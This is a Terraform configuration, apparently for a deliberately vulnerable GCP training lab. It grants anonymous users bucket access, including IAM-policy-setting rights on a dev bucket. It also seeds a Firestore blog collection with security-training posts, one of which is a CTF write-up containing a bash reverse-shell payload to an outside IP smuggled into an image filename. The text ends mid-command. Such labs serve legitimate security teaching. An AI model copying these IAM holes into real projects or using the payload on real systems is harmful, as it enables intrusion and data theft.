resource "random_id" "bucket_prefix" {
  byte_length = 8
}

data "google_billing_account" "acct" {
  display_name = "My Billing Account"
}

resource "google_project" "my_project" {
  name            = "Gcp-Goat"
  project_id      = "gcp-goat-${random_id.bucket_prefix.hex}"
  billing_account = data.google_billing_account.acct.id
}

variable "region" {
  type    = string
  default = "us-west1"
}

provider "google" {
  region = var.region
}


resource "google_storage_bucket" "data_bucket" {
  name          = "prod-blogapp-${random_id.bucket_prefix.hex}"
  force_destroy = true
  project       = google_project.my_project.project_id
  location      = "US"
  storage_class = "STANDARD"
  depends_on = [
    google_project.my_project
  ]
}
# Prod Bucket
resource "google_storage_bucket" "dev_bucket" {
  name          = "dev-blogapp-${random_id.bucket_prefix.hex}"
  force_destroy = true
  project       = google_project.my_project.project_id
  location      = "US"
  storage_class = "STANDARD"
  depends_on = [
    google_project.my_project
  ]
}

resource "google_project_iam_custom_role" "prod-role" {
  role_id     = "prodbucket"
  project     = google_project.my_project.project_id
  title       = "Prod role"
  description = "Used for prod buckets"
  permissions = ["storage.objects.get"]
}

resource "google_storage_bucket_iam_member" "add_policy_role" {
  bucket = google_storage_bucket.data_bucket.name
  role   = google_project_iam_custom_role.prod-role.name
  member = "allUsers"
}
# Dev Bucket
resource "google_project_iam_custom_role" "dev-role" {
  role_id     = "development"
  project     = google_project.my_project.project_id
  title       = "Dev role"
  description = "Used for dev buckets"
  permissions = ["storage.objects.get", "storage.buckets.setIamPolicy", "storage.buckets.getIamPolicy"]
}

resource "google_storage_bucket_iam_member" "add_policy_role2" {
  bucket = google_storage_bucket.dev_bucket.name
  role   = google_project_iam_custom_role.dev-role.name
  member = "allUsers"
}

# populate data

resource "google_project_service" "firestore" {
  service                    = "firestore.googleapis.com"
  disable_dependent_services = true
  project                    = google_project.my_project.project_id
  depends_on = [
    google_project.my_project
  ]
}

resource "google_app_engine_application" "app" {
  location_id   = "us-central"
  database_type = "CLOUD_FIRESTORE"
  project       = google_project.my_project.project_id
  depends_on = [
    google_project_service.firestore
  ]
}

locals {
  user_data = jsondecode(file("modules/module-1/resources/firestore/users.json"))
}
resource "google_firestore_document" "user_doc_1" {
  collection  = "users"
  document_id = "my-doc-1"
  fields      = jsonencode(local.user_data["1"])
  project     = google_project.my_project.project_id
  depends_on = [
    google_storage_bucket.data_bucket,
    google_app_engine_application.app
  ]
}
resource "google_firestore_document" "user_doc_2" {
  collection  = "users"
  document_id = "my-doc-2"
  fields      = jsonencode(local.user_data["2"])
  project     = google_project.my_project.project_id
  depends_on = [
    google_firestore_document.user_doc_1
  ]
}
resource "google_firestore_document" "user_doc_3" {
  collection  = "users"
  document_id = "my-doc-3"
  fields      = jsonencode(local.user_data["3"])
  project     = google_project.my_project.project_id
  depends_on = [
    google_firestore_document.user_doc_2
  ]
}
resource "google_firestore_document" "user_doc_4" {
  collection  = "users"
  document_id = "my-doc-4"
  fields      = jsonencode(local.user_data["4"])
  project     = google_project.my_project.project_id
  depends_on = [
    google_firestore_document.user_doc_3
  ]
}
resource "google_firestore_document" "user_doc_5" {
  collection  = "users"
  document_id = "my-doc-5"
  fields      = jsonencode(local.user_data["5"])
  project     = google_project.my_project.project_id
  depends_on = [
    google_firestore_document.user_doc_4
  ]
}
resource "google_firestore_document" "user_doc_6" {
  collection  = "users"
  document_id = "my-doc-6"
  fields      = jsonencode(local.user_data["6"])
  project     = google_project.my_project.project_id
  depends_on = [
    google_firestore_document.user_doc_5
  ]
}
resource "google_firestore_document" "user_doc_7" {
  collection  = "users"
  document_id = "my-doc-7"
  fields      = jsonencode(local.user_data["7"])
  project     = google_project.my_project.project_id
  depends_on = [
    google_firestore_document.user_doc_6
  ]
}
resource "google_firestore_document" "blog_post_1" {
  collection  = "blogs"
  document_id = "1"
  fields      = <<EOT
  {
        "id": {
            "stringValue": "1"
        },
        "email": {
            "stringValue": "johndoe@gmail.com"
        },
        "authorName": {
            "stringValue": "John Doe"
        },
        "getRequestImageData": {
            "stringValue": "https://storage.googleapis.com/${google_storage_bucket.data_bucket.name}/images/20220525172652568597.png"
        },
        "postContent": {
            "stringValue": "<p>Cloud security is a deeply nuanced topic. Although the fundamentals remain the same as traditional cybersecurity, most practitioners are unfamiliar with the intricacies of cloud security.</p><p>To bridge this gap, our AWS cloud security syllabus covers IAM, API Gateway, Lambda, Cloud Databases and S3. By learning to secure these 5 most commonly used AWS components, professionals with a traditional cybersecurity background can be equipped with cloud-compatible skills.</p><p>We covered the technicals of these 5 components in a&nbsp;<a href=\"https://blog.pentesteracademy.com/aws-security-iam-api-gateway-lambda-dynamodb-s3-5712da98aaf7\" rel=\"noopener noreferrer\" target=\"_blank\" style=\"color: inherit;\">previous blog post</a>, but what exactly do the labs entail? Let\u2019s find out:</p><h1>What are Pentester Academy\u2019s AWS Cloud Security labs?</h1><p>Our AWS labs are the first in the industry to provide a dedicated sandbox environment for AWS pentesting \u2014 essentially, they\u2019re a \u201ccloud playground\u201d where you can learn and practice attacks without the hassle and risk of using your personal AWS account. Here\u2019s what makes our cloud labs unique:</p><p><br></p><ul><li><strong>No AWS account required</strong>: our dedicated sandbox environment already contains real AWS accounts and lets you pentest cloud deployments directly in your browser. Getting started with cloud security has never been easier!</li><li><strong>Industry-relevant syllabus</strong>: Given that most AWS deployments are breached by a common set of vulnerabilities which attackers repeatedly use, learning our syllabus \u2014 which covers such vulnerabilities \u2014 makes you job-ready immediately.</li><li><strong>On-demand bootcamp recordings included:&nbsp;</strong>annual subscribers also get access to 19+ hours of bootcamp recordings to get you up to speed on both theory and practice!</li></ul><p><br></p><h1>How the labs are structured</h1><p>Our 50+ AWS Cloud Security lab exercises are split into 6 categories \u2014 IAM, API Gateway, Lambda, Databases, DynamoDB and S3. Collectively, they cover the 5 components mentioned above (DynamoDB falls under Cloud Databases), and teach you how to identify and leverage misconfigurations hands-on.</p><p><br></p><p>Each category covers the corresponding component in depth, from basics/enumeration to advanced scenarios. Here are some attacks you can look forward to learning:</p><ol><li>Leverage misconfigured IAM policies to escalate privileges</li><li>Understand AWS Lambda and exploit vulnerable applications to get a foothold</li><li>Abuse overly permissive policies and misconfigured roles to escalate privileges</li><li>Attack API Gateway endpoints via various means to bypass authentication</li><li>Leverage S3 misconfigurations to steal data and chain attacks</li><li>Gain persistency on a Lambda environment and steal any data processed by the lambda function, even if the principle of least privilege is followed</li></ol><p><br></p>"
        },
        "postingDate": {
            "stringValue": "2022-05-25T00:00:00.000Z"
        },
        "postTitle": {
            "stringValue": "Pentester Academy's AWS Cloud Security Labs"
        },
        "postStatus": {
            "stringValue": "approved"
        }
    }
  EOT
  project     = google_project.my_project.project_id
  depends_on = [
    google_firestore_document.user_doc_7
  ]
}
resource "google_firestore_document" "blog_post_2" {
  collection  = "blogs"
  document_id = "2"
  fields      = <<EOT
  {
        "id": {
            "stringValue": "2"
        },
        "email": {
            "stringValue": "johndoe@gmail.com"
        },
        "authorName": {
            "stringValue": "John Doe"
        },
        "getRequestImageData": {
            "stringValue": "https://storage.googleapis.com/${google_storage_bucket.data_bucket.name}/images/20220525172652548627.png"
        },
        "postContent": {
            "stringValue": "<p><em>In our lab walkthrough series, we go through selected lab exercises on our AttackDefense Platform. Premium labs require a&nbsp;</em><a href=\"https://www.pentesteracademy.com/promos/attackdefenselabs\" rel=\"noopener noreferrer\" target=\"_blank\" style=\"color: inherit;\"><em>subscription</em></a><em>, but you can&nbsp;</em><a href=\"http://attackdefense.pentesteracademy.com/\" rel=\"noopener noreferrer\" target=\"_blank\" style=\"color: inherit;\"><em>sign in for free</em></a><em>&nbsp;to try our community labs and view the list of topics \u2014 no subscription or VPN required!</em></p><p><br></p><p>The&nbsp;<a href=\"https://github.com/rapid7/metasploit-framework\" rel=\"noopener noreferrer\" target=\"_blank\" style=\"color: inherit;\"><strong>Metasploit Framework</strong></a>&nbsp;is a popular and powerful network penetration testing tool, used widely all around the world. The framework provides ready to use exploits, information-gathering modules to take advantage of the system\u2019s weaknesses. It has powerful in-built scripts and plugins that allow us to automate the process of exploitation.</p><h1>Lab Scenario</h1><p><strong>We have set up the below scenario in our&nbsp;</strong><a href=\"https://www.pentesteracademy.com/onlinelabs?utm_source=blog&amp;utm_medium=organic&amp;utm_campaign=labexercise\" rel=\"noopener noreferrer\" target=\"_blank\" style=\"color: inherit;\"><strong>Attack-Defense labs</strong></a><strong>&nbsp;for our students to practice. The screenshots have been taken from our online lab environment.</strong></p><p><br></p><p><strong>Lab:&nbsp;</strong><a href=\"https://attackdefense.pentesteracademy.com/challengedetails?cid=1492\" rel=\"noopener noreferrer\" target=\"_blank\" style=\"color: inherit;\">https://attackdefense.pentesteracademy.com/challengedetails?cid=1492</a></p><p>This lab comprises a kali machine with all tools installed on it. The user or practitioner will get a shell command-line interface (CLI) access to the Kali machine, through the web browser.</p><h1>Challenge Statement</h1><p>The target server as described below is running a vulnerable web application. Your task is to fingerprint the application using command-line tools available on the Kali terminal and then exploit the application using the appropriate Metasploit module.</p><p><br></p><p><strong>Objective:&nbsp;</strong>Get a Meterpreter shell on the target!</p><p><br></p>"
        },
        "postingDate": {
            "stringValue": "2022-04-04T00:00:00.000Z"
        },
        "postTitle": {
            "stringValue": "Premium Lab: Navigate CMS Unauthenticated Remote Code Execution"
        },
        "postStatus": {
            "stringValue": "approved"
        }
    }
  EOT
  project     = google_project.my_project.project_id
  depends_on = [
    google_firestore_document.blog_post_1
  ]
}
resource "google_firestore_document" "blog_post_3" {
  collection  = "blogs"
  document_id = "3"
  fields      = <<EOT
  {
        "id": {
            "stringValue": "3"
        },
        "email": {
            "stringValue": "johndoe@gmail.com"
        },
        "authorName": {
            "stringValue": "John Doe"
        },
        "getRequestImageData": {
            "stringValue": "https://storage.googleapis.com/${google_storage_bucket.data_bucket.name}/images/20220525173155599484.png"
        },
        "postContent": {
            "stringValue": "<p>Mass Assignment occurs when an API takes user input directly and maps the values passed by the user to the backend object models.</p><h2><strong>What\u2019s wrong with that?</strong></h2><p>If there are sensitive fields in the data models like&nbsp;<em>isAdmin</em>,&nbsp;<em>isPremiumUser, isASubscriber</em>, etc, a malicious party who controls these values can wreck havoc! They could make themselves an admin/premium user/subscriber and (mis)use the product or service \u2014 not an ideal situation.</p><h1><strong>Why does Mass Assignment happen?</strong></h1><blockquote><em>Oh that was intern\u2019s mistake\u2026</em></blockquote><p><br></p><p>Really? Nah\u2026 Let\u2019s discuss the actual reasons!</p><p>Let\u2019s face it \u2014 developers are lazy! Many rely on a lot of frameworks and boiler-plate code. Any method that makes their tasks easy, finds its way into their code.</p><p>Frameworks and programming languages help developers map user requests to object mapping just using a one-liner! As developers, we love the convenience but that\u2019s what leads to this vulnerability in the first place!</p><p>This is the reality of development work \u2014 not something I made up, but something I have experienced myself while I was a developer. It\u2019s so profound and second-nature to the developers! If you are one, or have been there, I am sure you would have that smile on your face :)</p><p>Mass Assignment is a cool bug that can get you a P1, if you are into pentesting or bug bounties! It\u2019s not that common and that\u2019s why it\u2019s holds a&nbsp;<a href=\"https://github.com/OWASP/API-Security/blob/master/2019/en/src/0xa6-mass-assignment.md\" rel=\"noopener noreferrer\" target=\"_blank\" style=\"color: inherit;\">6th position in the API Security Top 10 list</a>.</p><h1>Case Study: Mass Assignment Exploitation in the Wild</h1><p>While keeping up on API Security, we came across this interesting post, which demonstrates a methodology to perform mass assignment, which aligns with our own, so it\u2019s worth sharing:</p><h2><a href=\"https://galnagli.com/Mass_Assignment/\" rel=\"noopener noreferrer\" target=\"_blank\" style=\"color: inherit;\">Mass Assignment exploitation in the wild - Escalating privileges in style</a></h2><p><a href=\"https://galnagli.com/Mass_Assignment/\" rel=\"noopener noreferrer\" target=\"_blank\" style=\"color: inherit;\">As I have been accepted to Synack's Red Team at the beginning of march, the opportunity emerged required me and other\u2026</a></p><p><a href=\"https://galnagli.com/Mass_Assignment/\" rel=\"noopener noreferrer\" target=\"_blank\" style=\"color: inherit;\">galnagli.com</a></p><p><br></p><h1><strong>Pentesting Methodology</strong></h1><p>The researcher had 2 accounts \u2014 1 with higher privileges and one with lower privileges. He then made profile updation requests to an endpoint and observed the parameters being passed in both the accounts \u2014 unprivileged and privileged.</p><p><br></p><p>This gave him a hint that there was an extra parameter in the API requests which was sent in the privileged user\u2019s profile update request.</p><p>So the next natural step was to try setting the same parameter in the unprivileged user\u2019s profile update request, and voila! That resulted in giving the unprivileged user privileged access! Bingo \u2014 that was Mass Assignment in action.</p><p>In our experience, we have also seen that sometimes the response to the updation requests reveals such parameters as well, and thus those should also be looked at while hunting for this vulnerability.</p><p><br></p>"
        },
        "postingDate": {
            "stringValue": "2022-03-08T00:00:00.000Z"
        },
        "postTitle": {
            "stringValue": "Hunting for Mass Assignment"
        },
        "postStatus": {
            "stringValue": "approved"
        }
    }
  EOT
  project     = google_project.my_project.project_id
  depends_on = [
    google_firestore_document.blog_post_2
  ]
}
resource "google_firestore_document" "blog_post_4" {
  collection  = "blogs"
  document_id = "4"
  fields      = <<EOT
  {
        "id": {
            "stringValue": "4"
        },
        "email": {
            "stringValue": "phasellus@aol.ca"
        },
        "authorName": {
            "stringValue": "Connor Cantrell"
        },
        "getRequestImageData": {
            "stringValue": "https://storage.googleapis.com/${google_storage_bucket.data_bucket.name}/images/20220525173359279634.png"
        },
        "postContent": {
            "stringValue": "<p><em>To help you master specific topics, we offer both bootcamp recordings and learning paths (curated sets of labs). Here, we outline our DevSecOps on-demand bootcamp and learning path, which begins with DevOps and teaches you how to integrate security into it.</em></p><p><em>For access,&nbsp;</em><a href=\"https://www.pentesteracademy.com/pricing\" rel=\"noopener noreferrer\" target=\"_blank\" style=\"color: inherit;\"><em>subscribe</em></a><em>&nbsp;to an annual plan, which includes on-demand bootcamps, learning paths and more labs for other topics!</em></p><h1>Introduction: DevOps vs. DevSecOps</h1><p>Any discussion of DevSecOps merits mention of DevOps as well. Before delving into the DevSecOps learning path, let\u2019s first compare DevOps and DevSecOps:</p><p><br></p><h2>DevOps: A framework for efficient software development</h2><p><img src=\"https://miro.medium.com/max/1400/1*HCs47KlvSjpOjvbar-mA6Q.png\" height=\"333\" width=\"700\"></p><p>The different components of the DevOps framework</p><p><a href=\"https://en.wikipedia.org/wiki/DevOps\" rel=\"noopener noreferrer\" target=\"_blank\" style=\"color: inherit;\">Wikipedia explains DevOps best</a>:&nbsp;<em>It is \u201ca set of practices that combines software development (Dev) and IT operations (Ops). It aims to shorten the systems development life cycle and provide continuous delivery with high software quality.\u201d</em></p><p>Today, DevOps has become a predominant approach in software and product development. It allows better visibility, coordination and faster iterations in comparison to other relatively older processes like&nbsp;<a href=\"https://www.guru99.com/software-development-life-cycle-tutorial.html\" rel=\"noopener noreferrer\" target=\"_blank\" style=\"color: inherit;\">SDLC&nbsp;</a>or&nbsp;<a href=\"https://www.atlassian.com/agile\" rel=\"noopener noreferrer\" target=\"_blank\" style=\"color: inherit;\">Agile</a>, making it popular.</p><p>But there lies a critical issue with DevOps: with this framework, software development teams do not take security into account. Along with high-pressure commercial timelines and lack of security awareness, developers end up releasing code containing vulnerabilities.</p><p>And thus, DevSecOps was born.</p><h2>DevSecOps: Integrating Security with DevOps</h2><p><img src=\"https://miro.medium.com/max/1400/1*6FvlY5IpeHYBzurnMUzkZA.png\" height=\"420\" width=\"700\"></p><p>DevSecOps = DevOps + Security</p><p>The name says it all: DevSecOps integrates security (Sec) into DevOps. DevSecOps is a set of practices of adding security components to each step of the DevOps process. It aims to shorten the systems development life cycle and provide continuous delivery with high software quality while taking care of the security aspect.</p><p>Instead of having a team for manual security testing, it is more efficient and cost/time-effective to have automated security checks to catch issues as soon as possible.</p><p>DevSecOps is thus a highly demanded and regarded skill in the industry. As a career-focused cybersecurity education company, we set out to equip professionals with DevSecOps knowledge through our on-demand bootcamp and learning path.</p>"
        },
        "postingDate": {
            "stringValue": "2022-04-12T00:00:00.000Z"
        },
        "postTitle": {
            "stringValue": "DevSecOps: Integrating Security with DevOps"
        },
        "postStatus": {
            "stringValue": "rejected"
        }
    }
  EOT
  project     = google_project.my_project.project_id
  depends_on = [
    google_firestore_document.blog_post_3
  ]
}
resource "google_firestore_document" "blog_post_5" {
  collection  = "blogs"
  document_id = "5"
  fields      = <<EOT
{
        "id": {
            "stringValue": "5"
        },
        "email": {
            "stringValue": "phasellus@aol.ca"
        },
        "authorName": {
            "stringValue": "Connor Cantrell"
        },
        "getRequestImageData": {
            "stringValue": "https://storage.googleapis.com/${google_storage_bucket.data_bucket.name}/images/20220525173435646544.png"
        },
        "postContent": {
            "stringValue": "<p><em>To help you master specific topics, we offer both bootcamp recordings and learning paths (curated sets of labs). In this post, we outline our WebApp Security on-demand bootcamp and learning path, which will help you build a solid foundation in WebApp pentesting.</em></p><p><em>For access,&nbsp;</em><a href=\"https://www.pentesteracademy.com/pricing\" rel=\"noopener noreferrer\" target=\"_blank\" style=\"color: inherit;\"><em>subscribe</em></a><em>&nbsp;to an annual plan, which includes on-demand bootcamps, learning paths and more labs for other topics!</em></p><h1>Why Learn Web Application Pentesting?</h1><p>Most enterprises, regardless of size, run their own&nbsp;<a href=\"https://en.wikipedia.org/wiki/Web_application\" rel=\"noopener noreferrer\" target=\"_blank\" style=\"color: inherit;\">web applications</a>. Vulnerabilities in these web applications make them prime targets for hackers \u2014 and hackers succeed at a very high cost both to enterprises and their customers.</p><p><br></p><p>Web application security is essential mainly because of the scale of impact. Millions of people interact with web applications every day to do everything from reading the news to shopping for groceries to planning their finances, and many of these applications store personal data such as addresses and credit card information. A single vulnerability is all a hacker needs to retrieve all of this. Thus, no pentester can be truly effective without a working understanding of web application security.</p><h1>Start with our WebApp Security Bootcamp</h1><p><a href=\"https://bootcamps.pentesteracademy.com/course/webapp-security-on-demand\" rel=\"noopener noreferrer\" target=\"_blank\" style=\"color: inherit;\"><img src=\"https://miro.medium.com/max/1400/0*n88y-XDW0qqIs6ST\" height=\"176\" width=\"700\"></a></p><p>Click&nbsp;<a href=\"https://bootcamps.pentesteracademy.com/course/webapp-security-on-demand\" rel=\"noopener noreferrer\" target=\"_blank\" style=\"color: inherit;\">here</a>&nbsp;to see what\u2019s covered.</p><p>This on-demand bootcamp lets you practice attacks on real-world web applications and teaches the subtle differences between pentesting traditional and cloud-based applications. Throughout 4 sessions, you will learn WebApp basics, OWASP Top 10 vulnerabilities and more, all via hands-on practice in our labs.</p><ul><li>12+ hours of live bootcamp recordings</li><li>50+ Lab Exercises</li></ul><p>After learning the concepts with the recordings, move on to our learning path which goes beyond the bootcamp\u2019s syllabus to cover common tools used in WebApp pentesting and more!</p><h1><strong>WebApp Pentesting Learning Path</strong></h1><p><img src=\"https://miro.medium.com/max/1400/1*2SsCgnQ7ljF4mkWbO9XOfg.png\" height=\"350\" width=\"700\"></p><p>In the Web Application Pentesting learning path, you\u2019ll learn to systematically dissect the inner mechanics of an application, chalk out the threatscape, identify possible attack vectors and then use various tools and techniques to launch the attack.</p><p>The learning path contains over 60 lab exercises, split into the below sections to build your skills progressively. The sections are standalone; however we recommend beginners tackle them in this order:</p><ul><li><strong>Web Application Basics:&nbsp;</strong>Before any pentesting, it is important to learn what web applications are and how they work.</li><li><strong>Tools of the Trade:</strong>&nbsp;Next, we\u2019ll look at manual exploitation techniques using popular open-source attack tools, such as Burp Suite and Gobuster.</li><li><strong>OWASP Top 10:&nbsp;</strong><a href=\"https://owasp.org/www-project-top-ten/\" rel=\"noopener noreferrer\" target=\"_blank\" style=\"color: inherit;\">OWASP Top 10</a>&nbsp;is an awareness document that outlines the most critical security risks to web applications. Here, you\u2019ll learn how to pentest according to the OWASP TOP 10 standard.</li><li><strong>Webapp CVEs (Common Vulnerabilities and Exposures):</strong>&nbsp;To round off your learning, you\u2019ll see how to search for publicly available exploits and leverage it to compromise a target machine.</li></ul><p>Overall, these labs and techniques are technology-stack agnostic and will use a combination of simulated and real-world applications. When you finish the entire learning path, you\u2019d have developed a solid foundation in Web Application Pentesting.</p><h2>Prerequisites</h2><p>To get the most out of this learning path, we recommend that you have:</p><p><br></p><ul><li>A basic knowledge of computers and networking</li><li>Familiarity with the Linux operating system</li></ul><p>Let\u2019s dive in!</p>"
        },
        "postingDate": {
            "stringValue": "2022-01-01T00:00:00.000Z"
        },
        "postTitle": {
            "stringValue": "Web Application Pentesting: A Versatile Skill"
        },
        "postStatus": {
            "stringValue": "approved"
        }
    }
  EOT
  project     = google_project.my_project.project_id
  depends_on = [
    google_firestore_document.blog_post_4
  ]
}
resource "google_firestore_document" "blog_post_6" {
  collection  = "blogs"
  document_id = "6"
  fields      = <<EOT
{
        "id": {
            "stringValue": "6"
        },
        "email": {
            "stringValue": "interdum.curabitur@aol.com"
        },
        "authorName": {
            "stringValue": "Raja Bauer"
        },
        "getRequestImageData": {
            "stringValue": "https://storage.googleapis.com/${google_storage_bucket.data_bucket.name}/images/20220525174934318996.png"
        },
        "postContent": {
            "stringValue": "<p><em>To help you master specific topics, we offer both bootcamp recordings and learning paths (curated sets of labs). In this post, we outline our Container Security on-demand bootcamp and learning path \u2014 covering everything from basics to advanced.</em></p><p><em>For access,&nbsp;</em><a href=\"https://www.pentesteracademy.com/pricing\" rel=\"noopener noreferrer\" target=\"_blank\" style=\"color: inherit;\"><em>subscribe</em></a><em>&nbsp;to an annual plan, which includes on-demand bootcamps, learning paths and more labs for other topics!</em></p><h1>Containers: an overview</h1><p>Over the last decade, largely because of the Docker open-source project, the interest in Linux container technology has exploded. Containers use operating system-level virtualization to isolate applications from one another. They are lightweight in comparison to virtual machines as they share the host machine\u2019s kernel.</p><p><br></p><p>Docker has enabled developers to rapidly build and share applications, and Kubernetes has enabled these applications to be deployed and scaled dynamically. This has led to the widespread adoption of Docker in the industry.</p><p>However, like all complex software systems, the container ecosystem is prone to misconfiguration, leading to vulnerabilities that can be exploited by malicious users. Because of this, understanding container security and being able to audit a container environment are critical skills that all security professionals should possess.</p><p><br></p><p><br></p><p>This is a 4-session beginner bootcamp that will teach you the basics of containers and how to secure them. Learn how misconfigured components can lead to breakout attacks and eventually, host compromise.</p><p>This on-demand bootcamp covers different tools and techniques to audit containers, container hosts, image repositories and container management tools. Our unique lab setup lets you try low-level breakout attacks which otherwise can only be done in local virtual machines.</p><ul><li>9+ hours of live bootcamp recordings</li><li>60+ Lab Exercises</li></ul><p><br></p><h2>What will you learn?</h2><p>The Container Security learning path contains 11 categories of lab exercises that cover the basic concepts of container security and pentesting. You will learn how to use various tools and commands to identify and exploit vulnerabilities in the different components of the container ecosystem.</p><p><br></p><h2>Prerequisites</h2><p>To get the most out of this learning path, we recommend that you have:</p><p><br></p><ul><li>A basic knowledge of computers and networking</li><li>Familiarity with the Linux operating system</li><li>Optionally, a basic knowledge of Docker</li></ul><p>While each set of labs can be completed in any order, we recommend the following sequence:</p><h2>Container Basics</h2><p><br></p><p>This section explores the container management systems Docker and Podman. The labs also cover the low-level components of the Docker system e.g. containerd, runc. Beginners will learn how to perform basic operations like pushing, pulling, creating and running containers. You will learn:</p><ul><li>Using Docker client to perform basic operations including push, pull, build images and interacting with the container/network</li><li>Using podman to create, manage and interact with containers, images and networks</li><li>Interacting with containerd to run containers</li><li>Running Docker containers using Docker images with runc and umoci</li></ul><p><br></p>"
        },
        "postingDate": {
            "stringValue": "2022-01-12T00:00:00.000Z"
        },
        "postTitle": {
            "stringValue": "Container Security: Securing the Docker Ecosystem"
        },
        "postStatus": {
            "stringValue": "approved"
        }
    }
  EOT
  project     = google_project.my_project.project_id
  depends_on = [
    google_firestore_document.blog_post_5
  ]
}
resource "google_firestore_document" "blog_post_7" {
  collection  = "blogs"
  document_id = "7"
  fields      = <<EOT
{
        "id": {
            "stringValue": "7"
        },
        "email": {
            "stringValue": "interdum.curabitur@aol.com"
        },
        "authorName": {
            "stringValue": "Raja Bauer"
        },
        "getRequestImageData": {
            "stringValue": "https://storage.googleapis.com/${google_storage_bucket.data_bucket.name}/images/20220525175114306915.png"
        },
        "postContent": {
            "stringValue": "<p>The Linux Operating System forms the basis of a huge number of the applications that we use every day on the Internet. Linux servers are configured for uses as varied as high-performance computing, storage, network routing, and web servers. This flexibility has meant that the management of a Linux server is a complex subject with plenty of room for error. A large number of deployments and configurations has also led to new vulnerabilities being discovered almost every day. To protect a deployment on Linux, a system administrator must ensure that the Linux servers are always up to date with the latest security patches. A single vulnerable service or a minor mistake in configuration could leave the server, and the data residing on it, vulnerable to attack.</p><p><br></p><p>As a pentester, it is important to know how to scout for vulnerabilities and the ways they can be exploited. But first, one has to know how Linux works. In our labs, you\u2019ll be using a Kali/Ubuntu Attacker machine to attack other Linux-based target machines.</p><p>Our learning path thus starts with Linux Basics, where you will learn concepts, commands and tools required to interact with various Linux services and applications. Specifically, the path covers:</p><ul><li>Understanding the Linux filesystem and users</li><li>Understanding the system and user crontabs</li><li>Learning the important Linux commands and tools</li><li>Fingerprinting web applications and network services such as FTP and SSH</li><li>Creating bi-directional connections with socat</li></ul><p>Once you\u2019re comfortable with Linux, we\u2019ll move on to explain Linux pentesting in the context of the 5 phases of hacking:</p><p><img src=\"https://miro.medium.com/max/1400/0*uSUaVG-jxHZEAkPv\" height=\"325\" width=\"700\"></p><p>The 5 phases of hacking is a well-known methodology amongst security professionals, where attacks start with a reconnaissance phase and end with covering tracks. In our learning path, we expand on this methodology and show you how to perform additional phases such as Pivoting and Exploit Research.</p><p>Let\u2019s dive right in!</p><h1>Reconnaissance</h1><p>Before attacking any application or service, it is important to gather as much information as possible. The more information an attacker has, the easier it will be to identify any misconfigurations and vulnerabilities. The objective of the reconnaissance section is to familiarize the student with the approach to follow for enumerating web applications and various network services, such as DNS, web servers, databases, caching systems, etc. Using the information, the attack vector and entry points can be identified and then used in the exploitation phase.</p><p><br></p><p>In our reconnaissance section, you\u2019ll learn:</p><ul><li>Identifying open ports on the machine</li><li>Identifying services running on the machine</li><li>Interacting with network services</li><li>Fingerprinting different types of services</li><li>Understanding service-specific misconfigurations</li><li>Enumerating files/directories on web applications</li><li>Scanning web application using popular scanners and identifying the entry points</li></ul><h1>Exploitation</h1><p>The objective of the exploitation phase is to establish access to a system or resource by leveraging a vulnerability or bypassing a security restriction. In this section, the student will learn how to search for exploits based on the information acquired in the reconnaissance phase and use them to compromise the application or service. Once the attacker has compromised a machine, it is possible to attack other machines on the same network which may not be exposed to the Internet.</p><p><br></p><p>This section covers:</p>"
        },
        "postingDate": {
            "stringValue": "2022-02-06T00:00:00.000Z"
        },
        "postTitle": {
            "stringValue": "Linux Pentesting: From Recon to Exploit Research"
        },
        "postStatus": {
            "stringValue": "pending"
        }
    }
  EOT
  project     = google_project.my_project.project_id
  depends_on = [
    google_firestore_document.blog_post_6
  ]
}
resource "google_firestore_document" "blog_post_8" {
  collection  = "blogs"
  document_id = "8"
  fields      = <<EOT
  {
        "id": {
            "stringValue": "8"
        },
        "email": {
            "stringValue": "orci.adipiscing@google.com"
        },
        "authorName": {
            "stringValue": "Quinn Baird"
        },
        "getRequestImageData": {
            "stringValue": "https://storage.googleapis.com/${google_storage_bucket.data_bucket.name}/images/20220525175420931108.png"
        },
        "postContent": {
            "stringValue": "<p>I will be discussing how you can go about gaining root on a target machine in 3 different ways! Let's jump right into it.</p><p><br></p><h1><strong>A little background on the Challenge</strong></h1><p>For those who haven\u2019t tried this CTF challenge yet, let me share some overview on the challenge. Then I\u2019ll jump to the real meat of this post and we\u2019ll learn how to get a shell session on the target machine in different ways!</p><p><br></p><p>The challenge consists of an Online Image Converter webapp (not the prettiest creature, but it works ;)</p><p><img src=\"https://miro.medium.com/max/1400/1*_lg1CLkZVX8Usypmwfw-DA.png\" height=\"366\" width=\"700\"></p><p>Image Converter webapp provided in the challenge</p><p>It provides 3 features:</p><ul><li>To generate an Image Art by supplying some text</li><li>To convert an image to another format (say from PNG to JPG)</li><li>To convert images to another format in BULK (expecting a zip archive to be uploaded).</li></ul><p>Looks benign, right? I would say, don\u2019t be quick to judge the book by its cover ;)</p><p>Okay, enough with background information. And now, the FUN part!</p><h1>Exploitation a.k.a. The FUN stuff</h1><p>In this post, I\u2019ll be covering 3 different ways in which you could have got the MOST difficult flag. Out of those, 2 ways let you have root shell on the target machine!</p><p><br></p><p>Excited? Let\u2019s get going\u2026</p><h2><strong>Approach 1:</strong></h2><p><strong>Objective:</strong>&nbsp;In this approach, I will cover how to get the most difficult flag without getting a root shell.</p><p><br></p><p><strong>Vulnerability:</strong>&nbsp;Command Injection in the image art generation</p><p><strong>Outcome:</strong>&nbsp;We will get the shell session of a low-privileged user (robert)</p><p><strong>Steps:</strong></p><p><strong>Step 1:</strong>&nbsp;Create a sample image using scrot utility (or any other way you prefer):</p><p><strong>Commands:</strong></p><p>scrot test.png</p><p>ls</p><p><img src=\"https://miro.medium.com/max/1400/1*0ETRH2LKxciaRBrNCCJU5Q.png\" height=\"288\" width=\"700\"></p><p>Generate a sample image to be uploaded to the webapp</p><p><strong>Step 2:</strong>&nbsp;Before uploading the image to the webapp, rename it so that once it gets processed by the backend code, the payload commands in the image name get executed and you get back a shell session!</p><p><strong>Commands:</strong></p><p>ip a</p><p>echo -n \u2018bash -i &gt;&amp; /dev/tcp/192.104.205.2/4444 0&gt;&amp;1\u2019 | base64</p><p><img src=\"https://miro.medium.com/max/1400/1*_s427zMl_viBGgcKdoN1mg.png\" height=\"293\" width=\"700\"></p><p>Check the IP address and encode a reverse shell payload</p><p>This is done because a file name cannot contain forward slashes (\u2018/\u2019).</p><p><strong>Step 3:</strong>&nbsp;Modify the name of the test.png file and have the payload name there instead.</p><p><strong>New Image Name:</strong>&nbsp;\u2018; bash -c \u201c$(echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTA0LjIwNS4yLzQ0NDQgMD4mMQ== | base64 -d)\u201d;.png\u2019</p><p><strong>Command:&nbsp;</strong>cp test.png \u2018; bash -c 